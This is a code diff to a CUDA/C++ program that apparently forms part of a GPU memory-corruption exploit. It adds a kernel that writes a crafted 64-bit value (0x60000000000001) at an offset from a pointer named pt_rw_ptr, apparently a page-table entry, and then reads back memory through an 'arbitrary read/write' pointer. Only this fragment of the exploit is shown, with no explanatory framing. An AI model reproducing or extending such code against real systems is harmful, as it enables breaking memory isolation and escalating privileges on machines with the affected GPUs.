@@ -9,6 +9,13 @@ pause ()
     while (std::cin.get() != '\n');
 }
 
+__global__ void memset_ptr(uint8_t *dst, uint64_t src, uint64_t size)
+{
+    for (size_t i = 0; i < size; i += 8) {
+        *(uint64_t*)(dst + i) = src; // array-style access
+    }
+}
+
 template <typename T>
 __global__ void cudaMemcpyKernel(T* dst, const T* src, size_t numElements) {
     size_t idx = blockIdx.x * blockDim.x + threadIdx.x;
@@ -73,6 +80,17 @@ int main() {
     newfile.read(reinterpret_cast<char*>(&ofs), sizeof(ofs));
     newfile.close();
 
+    cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)pt_rw_ptr + ofs, 8);
+    std::cout << pt_rw_ptr << *(void**)copy_ptr << '\n';
+    // cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)(arb_rw_ptr), 8);
+    // std::cout << arb_rw_ptr << *(void**)copy_ptr << '\n';
+
+
+    pause();
+
+
+    memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + ofs, (uint64_t)(0x60000000000001), 8);
+    cudaDeviceSynchronize();
     cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)pt_rw_ptr + ofs, 8);
     std::cout << pt_rw_ptr << *(void**)copy_ptr << '\n';
     cudaMemcpyArray((uint8_t*)copy_ptr, (uint8_t*)(arb_rw_ptr), 8);
